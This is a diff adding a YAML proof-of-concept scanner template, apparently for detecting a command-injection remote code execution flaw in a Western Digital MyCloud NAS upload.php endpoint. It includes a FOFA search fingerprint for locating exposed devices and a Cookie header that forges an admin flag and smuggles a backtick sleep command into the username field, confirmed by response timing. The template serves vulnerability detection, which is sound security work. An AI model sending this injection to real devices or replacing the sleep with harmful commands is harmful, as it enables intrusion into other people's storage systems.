@@ -1,0 +1,19 @@
+id: poc-yaml-west-nas-upload-php-rce
+info:
+  name: 西部数码 NAS upload.php 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: western_digital_mycloud_nas
+  fofa: icon_hash="-1074357885" && header="PHP/5.4.16"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /web/php/upload.php
+  headers:
+    Cookie: isAdmin=1;username=a" `sleep {{.t1}}` "
+  expression: status_code == 200 && contains(body,"<status>timeout</status>") && contains(body,"sleep")
+    && contains(content_type,"text/xml") && duration > t1 && duration < t2
+transport: http
